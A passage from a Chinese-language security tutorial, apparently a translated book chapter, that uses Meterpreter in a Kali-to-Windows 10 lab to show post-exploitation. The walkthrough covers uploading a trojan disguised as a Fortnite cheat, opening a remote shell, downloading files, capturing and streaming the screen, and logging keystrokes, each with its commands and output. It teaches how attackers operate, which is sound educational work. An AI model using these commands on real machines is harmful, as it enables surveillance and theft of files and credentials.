    你会看到音乐、图片、视频等文件夹，就像任何其他 Windows 计算机一样。攻击者可以使用这些命令浏览目标计算机并查找可窃取的有趣文件。\n\n2. 将 `Fortnite_cheat_mode.exe`\
    \ 恶意软件文件的副本从 Kali VM 上传到 `Documents` 文件夹：\n\n```\nmeterpreter > upload /home/kali/Desktop/Fortnite_cheat_mode.exe\
    \ \n[*] uploading  : /home/kali/Desktop/Fortnite_cheat_mode.exe -> Fortnite_cheat_mode.exe\n\
    [*] Uploaded 72.07 KiB of 72.07 KiB (100.0%): /home/kali/Desktop/Fortnite_cheat_mode.exe\
    \ -> Fortnite_cheat_mode.exe\n[*] uploaded   : /home/kali/Desktop/Fortnite_cheat_mode.exe\
    \ -> Fortnite_cheat_mode.exe\n```\n\n3. 切换回 Windows 10 VM 并打开 `Documents` 文件夹。你应该能看到新上传的木马文件，如\
    \ 图 6-6 所示。\n\n![图 6-6：我们可以从 Kali 将文件上传到受感染的 Windows 10 VM。](img/f06006.png)\n\
    \n图 6-6：我们可以从 Kali 将文件上传到受感染的 Windows 10 VM。\n\n现在你在 Windows VM 上有了木马的备份，如果 Windows\
    \ Defender 重新启动并删除 `Downloads` 文件夹中的木马，你随时可以将其从 `Documents` 复制并粘贴到 `Downloads`。一旦有人通过网络或电子邮件打开单个受感染的文件，攻击者通常会在计算机的不同位置上传多个病毒，以确保他们能够保持对目标机器的控制。\n\
    \n## 从受害者计算机下载文件\n\nMeterpreter 中的 `download` 命令允许你从受害者计算机下载文件。要尝试一下，我们将在 Windows\
    \ VM 上创建一个示例文本文件，然后将其窃取。\n\n1. 在 `meterpreter >` 提示符处输入此命令，以远程控制受害者计算机的 Windows\
    \ 命令行终端，即 `shell`。\n\n```\nmeterpreter > shell\nProcess 4952 created.\nChannel\
    \ 1 created.\nMicrosoft Windows [Version 10.0.17763.379]\n(c) 2018 Microsoft Corporation.\
    \ All rights reserved.\n```\n\n2. 现在创建一个名为 `hacked.txt` 的文件，内容为 “You’ve been hacked!”\n\
    \n```\nC:\\Users\\IEUser\\Documents> echo \"You've been hacked!\" > hacked.txt\n\
    echo \"You've been hacked!\" > hacked.txt\n```\n\n3. 检查 Windows VM 上的 `Documents`\
    \ 文件夹。你应该能看到我们刚刚从 Kali 远程创建的 `hacked.txt` 文件。\n\n4. 回到 Kali，退出 Windows shell 并返回\
    \ Meterpreter：\n\n```\nC:\\Users\\IEUser\\Documents> exit\nexit\n```\n\n5. 现在将文件从\
    \ Windows 下载到你的 Kali VM：\n\n```\nmeterpreter > download hacked.txt\n[*] Downloading:\
    \ hacked.txt -> hacked.txt\n[*] Downloaded 24.00 B of 24.00 B (100.0%): hacked.txt\
    \ -> hacked.txt\n[*] download   : hacked.txt -> hacked.txt\n```\n\n6. 最后，使用以下命令查看文件内容，即我们的\
    \ “You’ve been hacked!” 消息。\n\n```\nmeterpreter > cat hacked.txt\n\"You've been\
    \ hacked!\"\n```\n\n我们已成功从受害者的计算机下载文件！在此示例中，这是一个我们（远程）从攻击 VM 创建的文件，但真正的攻击者可以下载更重要的信息。当\
    \ Windows 用户运行 Meterpreter 木马时，Windows 用户可访问的任何文件都会变成攻击者可下载的文件：客户列表、家庭照片、预算电子表格、税务表格、银行对账单、员工数据、医疗记录、有价值的知识产权，或\
    \ `any` 类型的敏感文件，只需几次按键即可被窃取。\n\n## 查看受害者计算机的屏幕\n\n像 Meterpreter shell 这样的木马通常被称为\
    \ `backdoors`，因为它们让攻击者绕过你所有其他安全措施（包括登录）来访问你的计算机。这就像从电影院的后门溜进去一样。当你在 Windows VM\
    \ 上点击 Meterpreter 木马文件时，你为你的计算机打开了一扇秘密之门，允许我们上传和下载文件。但情况更糟：你已为我们的攻击 VM 提供了一个后门，用于查看你的计算机屏幕、记录你的按键，甚至打开你的网络摄像头！为了证明这一点，我们将尝试从\
    \ Kali 中查看 Windows VM 的屏幕。\n\n1. 在 Meterpreter shell 中输入 `screenshot -v true`。使用此命令，攻击者可以发现受害机器的用户正在看到什么。\n\
    \n```\nmeterpreter > screenshot -v true\nScreenshot saved to: /home/kali/Desktop/kYpTvFbl.jpeg\
    \ \n```\n\n2. 应该会弹出一个窗口，显示来自 Windows VM 的屏幕截图，如 图 6-7 所示。\n\n![图 6-7：从 Windows\
    \ VM 捕获屏幕截图](img/f06007.png)\n\n图 6-7：从 Windows VM 捕获屏幕截图\n\n3. 你甚至可能能够进一步实时监视用户的计算机屏幕。在\
    \ Meterpreter 中，输入 `screenshare` 命令：\n\n```\nmeterpreter > screenshare\n[*] Preparing\
    \ player...\n[*] Opening player at:  /home/kali/oDgBGMiY.html\n[*] Streaming...\n\
    ```\n\n此命令并不总是有效，并且可能会使你的两个 VM（以及你的主机计算机）运行缓慢，因为它试图通过虚拟网络将 Windows 10 VM 的计算机屏幕的实时视频流传输到\
    \ Kali VM。但如果它有效，你将在 Kali 的浏览器窗口中看到 Windows 10 VM 的桌面，如 图 6-8 所示。\n\n4. 切换到你的\
    \ Windows VM，移动一些文件或窗口，清空回收站，或打开一个网页。如果你有多个显示器或足够的空间同时显示两个 VM，你可以通过 Kali 浏览器中的流媒体视频观察你在\
    \ Windows VM 中所做的一切。毛骨悚然，对吧？\n\n5. 点击回到 Kali 中的 Meterpreter 终端窗口，并按 CTRL-C 停止\
    \ screenshare。\n\n![图 6-8：`screenshare` 命令允许 Kali 上的攻击者通过互联网监视你的 Windows 桌面。](img/f06008.png)\n\
    \n图 6-8：`screenshare` 命令允许 Kali 上的攻击者通过互联网监视你的 Windows 桌面。\n\n## 记录按键\n\n一旦控制了一台机器，攻击者就可以记录用户的每一个按键。这使攻击者能够记录用户正在输入的内容，包括搜索、命令、密码等。让我们看看它是如何工作的。\n\
    \n1. 在 Meterpreter shell 中输入 `keyscan_start` 以开始记录目标计算机的按键：\n\n```\nmeterpreter\
    \ > keyscan_start\nStarting the keystroke sniffer ...\n```\n\n2. 切换回 Windows VM，在搜索栏中输入\
    \ `notepad`，并打开记事本应用。\n\n3. 将此信息输入到记事本中：\n\n```\nMy credit card number is not\
    \ 1111 1111 1111 1111with an expiration of 11/2028and a cvv of 111\n```\n\n当然，你永远不应该以明文形式在计算机上存储此类敏感信息，但世界上许多人确实如此。\n\
    \n4. 切换回 Kali VM 并输入 `keyscan_dump` 以查看记录的按键：\n\n```\nmeterpreter > keyscan_dump\n\
    Dumping captured keystrokes...\nnotepad<CR>\n<Shift>My credit card number is not\
    \ 1111 1111 1111 1111<CR>\nwith an expiration of 11/2028<CR>\nand a cvv of 111<CR>\n\
    ```\n"
